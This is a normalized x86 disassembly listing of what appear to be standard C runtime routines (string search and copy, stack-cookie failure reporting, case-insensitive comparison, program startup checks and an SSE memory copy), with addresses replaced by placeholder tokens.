cmp edx 0xfffffffe
je r-xdata
test [ eax + 0x24 ] 0x7f
jne r-xdata
mov [ ebx ] cl
inc ebx
mov [ ebp - 0x28 ] ebx
cmp cl 0xa
jne r-xdata
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov [ ebp - 0x24 ] ecx
cmp ecx 0xffffffff
jne r-xdata
mov eax edx
sar eax 0x5
and edx 0x1f
shl edx 0x6
add edx [ eax * 4 + rw-data ]
jmp r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
jmp r-xdata
test [ edx + 0x24 ] 0x80
je r-xdata
sub_40f3b0
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_40f45d
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
call sub_411550
push 0x16
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
xor eax eax
mov [ ecx ] ax
jmp r-xdata
pop esi
pop ebp
retn
push ebx
push edi
mov ebx ecx
mov edi eax
cmp edx 0xffffffff
jne r-xdata
xor eax eax
mov [ ecx ] ax
sub esi ecx
sub ebx esi
test edx edx
jne r-xdata
dec edi
je r-xdata
test edi edi
pop edi
pop ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ebx ] ax
dec edx
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
movzx eax [ esi ]
mov [ ebx + esi ] ax
lea esi [ esi + 0x2 ]
test ax ax
je r-xdata
jmp r-xdata
movzx eax [ esi + ebx ]
mov [ ebx ] ax
lea ebx [ ebx + 0x2 ]
test ax ax
je r-xdata
xor eax eax
mov [ ecx ] ax
call sub_411550
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
push 0x50
mov [ ecx + eax * 2 - 0x2 ] dx
pop eax
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_411714
mov eax esi
sub_40f51b
push ebp
mov ebp esp
call [ IsDebuggerPresent@IAT ]
push 0x1
mov [ rw-data ] eax
call sub_414d74
push [ ebp + 0x8 ]
call sub_4150bc
cmp [ rw-data ] 0x0
pop ecx
pop ecx
jne r-xdata
push 0xc0000409
call sub_4150a7
pop ecx
pop ebp
retn
push 0x1
call sub_414d74
pop ecx
sub_40f558
push ebp
mov ebp esp
sub esp 0x324
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x324 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov [ eax + rw-data ] 0x2
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push 0x4
pop eax
shl eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push r--data
call sub_40f51b
leave
retn
push 0x2
pop ecx
int 0x29
sub_40f65d
push ebp
mov ebp esp
sub esp 0x31c
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x31c ]
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
mov [ eax + rw-data ] ecx
push r--data
call sub_40f51b
leave
retn
mov ecx [ ebp + 0x8 ]
int 0x29
sub_40f72b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_40f7f1
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40f76b
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_40f799
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40f799
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
call sub_40f82f
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
push [ edi + 0x4 ]
mov ecx esi
call sub_40f7f1
jmp r-xdata
sub_40f7cc
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40f82f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_40e8f2#2
pop ecx
sub_40f7f1
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push ebx
mov ebx ecx
je r-xdata
pop ebx
pop ebp
retn 0x4
push edi
push [ ebp + 0x8 ]
call sub_410750
lea edi [ eax + 0x1 ]
push edi
call sub_40e92a
pop ecx
pop ecx
mov [ ebx + 0x4 ] eax
test eax eax
je r-xdata
pop edi
push [ ebp + 0x8 ]
push edi
push eax
call sub_4150d2
add esp 0xc
mov [ ebx + 0x8 ] 0x1
sub_40f858
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] 0x0
test ecx ecx
jne r-xdata
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_415d5f
mov edx eax
mov [ esi + 0x8 ] edx
mov ecx [ edx + 0x6c ]
mov [ esi ] ecx
mov ecx [ edx + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
test [ edx + 0x70 ] eax
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ecx + 0x70 ]
test al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ rw-data ]
test [ ecx + 0x70 ] eax
jne r-xdata
call sub_4153ac
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or eax 0x2
mov [ ecx + 0x70 ] eax
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_41572e
mov [ esi + 0x4 ] eax
sub_40f8e0
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f973
add esp 0xc
pop ebp
retn
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
mov eax 0x7fffffff
pop ebp
retn
push ebx
push esi
push edi
push 0x41
pop edi
push 0x5a
sub edx ecx
pop ebx
mov esi eax
cmp ax bx
ja r-xdata
add ecx 0x2
test si si
je r-xdata
cmp ax bx
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
movzx ecx ax
movzx eax si
pop edi
pop esi
sub eax ecx
pop ebx
pop ebp
retn
cmp si ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax di
jb r-xdata
movzx eax [ edx + ecx ]
cmp ax di
jb r-xdata
sub_40f973
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push ebx
push esi
push [ ebp + 0x10 ]
call sub_40f858
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
mov edx 0x7fffffff
jmp r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
pop esi
pop ebx
je r-xdata
mov eax [ ebp - 0x10 ]
push edi
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax edx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_415b76
movzx edi ax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
lea ebx [ ebx + 0x2 ]
call sub_415b76
add esp 0x10
movzx eax ax
lea esi [ esi + 0x2 ]
test di di
je r-xdata
push 0x41
pop ecx
push 0x5a
sub ebx esi
pop edx
movzx edx di
movzx eax ax
sub edx eax
pop edi
cmp di ax
je r-xdata
mov edi eax
cmp ax dx
ja r-xdata
add esi 0x2
test di di
je r-xdata
cmp ax dx
ja r-xdata
add eax 0x20
movzx edi ax
jmp r-xdata
cmp di ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ esi ]
cmp ax cx
jb r-xdata
movzx eax [ ebx + esi ]
cmp ax cx
jb r-xdata
jmp r-xdata
sub_40fa4c
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x18 ]
push ebx
push edi
push [ ebp + 0xc ]
call sub_40f858
mov ebx [ ebp + 0x8 ]
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x74 ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0x74 ] 0x1
jle r-xdata
call sub_411550
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov eax ebx
sar eax 0x8
mov [ ebp + 0x8 ] eax
lea ecx [ ebp - 0x18 ]
movzx eax al
push ecx
push eax
call sub_41602d
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0x90 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_415f7e
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
mov eax [ ecx + 0x94 ]
movzx ecx [ eax + ebx ]
je r-xdata
test eax eax
je r-xdata
movzx edx [ ebp - 0x8 ]
movzx eax [ ebp - 0x7 ]
shl edx 0x8
or edx eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
movzx eax [ ebp - 0x8 ]
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push edi
push [ eax + 0xa8 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_41625d
add esp 0x24
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax edx
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
pop edi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_40fb8d
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_40fa4c
pop ecx
pop ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x41 ]
cmp eax 0x19
ja r-xdata
mov eax ecx
pop ebp
retn
add ecx 0x20
sub_40fbb9
push ebp
mov ebp esp
push ecx
push ebx
xor ebx ebx
push esi
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_411550
push 0x16
pop esi
mov [ eax ] esi
call sub_411714
mov eax esi
jmp r-xdata
call sub_414e1b
test eax eax
jne r-xdata
pop esi
pop ebx
leave
retn
xor eax eax
push eax
push eax
push 0xffffffff
push [ ebp + 0x8 ]
mov [ esi ] eax
push eax
push ebx
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
call [ AreFileApisANSI@IAT ]
test eax eax
jne r-xdata
add eax eax
push eax
call sub_41100b
pop ecx
mov [ esi ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_41152f
xor ebx ebx
inc ebx
xor eax eax
jmp r-xdata
push [ ebp - 0x4 ]
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push 0x0
push ebx
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
xor eax eax
inc eax
call [ GetLastError@IAT ]
push eax
call sub_41152f
push [ esi ]
call sub_40e8f2
and [ esi ] 0x0
pop ecx
jmp r-xdata
pop ecx
sub_40fc69
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x0
call [ GetModuleHandleExW@IAT ]
test eax eax
je r-xdata
leave
retn
push r--data
push [ ebp - 0x4 ]
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_40fceb
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_4165a1
push r--data
push r--data
call sub_40fde4
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_4164b0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_4162c1
call sub_40e8b3
pop ecx
mov esi r--data
mov edi r--data
jmp r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
add esi 0x4
call eax
xor eax eax
push rw-data
call sub_4164b0
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_40fd90
push esi
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
push esi
call sub_410f83
push esi
call sub_4116dc
push esi
call sub_41150f
push esi
call sub_416650
push esi
call sub_41666a
push esi
call sub_41663f
add esp 0x18
pop esi
jmp sub_414e5a
sub_40fdc8
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_40fde4
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_40fe18
push 0x1c
push r--data
call sub_4110a0
push 0x8
call sub_4162e1
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x1
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ff32
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] 0x1
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_4110e5
retn
mov [ rw-data ] 0x1
push 0x8
call sub_416445
pop ecx
push [ ebp + 0x8 ]
call sub_40fc9b
push r--data
push r--data
call sub_40fdc8
pop ecx
pop ecx
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
je r-xdata
push r--data
push r--data
call sub_40fdc8
pop ecx
pop ecx
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] edi
push 0x0
call [ EncodePointer@IAT ]
cmp [ edi ] eax
je r-xdata
sub edi 0x4
mov [ ebp - 0x24 ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
push [ edi ]
call esi
mov esi eax
push 0x0
call [ EncodePointer@IAT ]
mov [ edi ] eax
call esi
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov [ ebp - 0x28 ] eax
push [ rw-data ]
call esi
mov ecx [ ebp - 0x28 ]
cmp [ ebp - 0x1c ] ecx
jne r-xdata
mov [ ebp - 0x1c ] ecx
mov ebx ecx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x20 ] eax
mov edi eax
jmp r-xdata
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x24 ] edi
sub_40ff5b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_40e8f2
pop ecx
sub_40ff79
push 0x14
push r--data
call sub_4110a0
call sub_414dfa
movzx esi ax
push 0x2
call sub_416dc1
pop ecx
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
mov [ ebp - 0x1c ] ebx
call sub_4115a4
test eax eax
jne r-xdata
xor ebx ebx
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_415e99
test eax eax
jne r-xdata
push 0x1c
call sub_4100c9
cmp [ eax + r--data ] ebx
setne bl
call sub_4162a1
and [ ebp - 0x4 ] 0x0
call sub_413b72
test eax eax
jns r-xdata
push 0x10
call sub_4100c9
call [ GetCommandLineW@IAT ]
mov [ rw-data ] eax
call sub_416ea8
mov [ rw-data ] eax
call sub_416aa6
test eax eax
jns r-xdata
push 0x1b
call sub_4100c9
call sub_416cdf
test eax eax
jns r-xdata
push 0x8
call sub_40fcb1
push 0x1
call sub_40fceb
pop ecx
test eax eax
je r-xdata
push 0x9
call sub_40fcb1
call sub_416f03
push esi
push eax
push 0x0
push __dos_header
call sub_401e79
mov esi eax
mov [ ebp - 0x24 ] esi
test ebx ebx
jne r-xdata
push eax
call sub_40fcb1
call sub_40fcdc
jmp sub_4100ba
push esi
call sub_40ff47
sub_410100
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
bt [ rw-data ] 0x1
jae r-xdata
cmp edi eax
jb r-xdata
cmp ecx 0x80
jb r-xdata
[ edi ] [ esi ]
jmp r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
test edi 0x3
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
jmp [ ecx * 4 + jump_table_4105d4 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4104d8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4105d4 ]
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_41034c ]
jmp [ ecx * 4 + jump_table_4103cc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_410438 ]
test edi 0x3
jne r-xdata
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4105d4 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_410438 ]
mov al [ esi ]
mov [ edi ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4105d4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4105d4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4105d4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_410438 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_410438 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_410438 ]
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
lea esp [ esp ]
nop
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
